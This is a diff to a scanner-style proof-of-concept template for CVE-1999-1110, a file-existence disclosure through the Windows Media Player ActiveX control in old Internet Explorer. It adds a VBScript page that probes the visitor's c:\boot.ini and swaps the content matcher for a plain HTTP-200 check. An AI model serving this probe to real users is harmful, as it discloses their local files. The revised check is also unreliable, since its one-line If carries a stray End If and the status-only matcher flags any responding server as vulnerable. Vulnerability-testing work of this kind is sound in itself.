@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = '通过构造包含 Windows Media Player ActiveX 控件 (clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6) 的网页，尝试在客户端加载本地文件（如 C:\autoexec.bat 与不存在文件），利用控件在文件存在/不存在时返回的 errorCode 差异，判断客户端本地文件是否存在，实现远程文件存在性探测。该 PoC 为纯客户端无损验证脚本，不改变目标状态。'
+author = "AVE"
+description = "通过 Windows Media Player ActiveX 控件检测本地文件是否存在"
 id = "POC-AVE-1999-0951"
-name = "CVE-1999-1110 IE5 Windows Media Player ActiveX 文件存在性探测 PoC"
+name = "CVE-1999-1110 PoC"
 severity = "medium"
-tags = ["ave-1999-0951"]
+tags = ["cve-1999-1110"]
 vuln_id = [
     "CVE-1999-1110",
     "AVE-1999-0951",
@@ -19,14 +19,10 @@ path = "/{{BaseURL}}/cve-1999-1110.html"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = '<html><body><script language="VBScript">Dim p:Set p=CreateObject("MediaPlayer.MediaPlayer.1"):On Error Resume Next:p.Open("c:\boot.ini"):If Err.Number=-2147221164 Then msg="FILE_NOT_EXIST" Else msg="FILE_EXIST":End If:document.write(msg)</script></body></html>'
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "WMP_FileExists",
-    "WMP_FileMissing",
-]
+status = [200]
+type = "status"
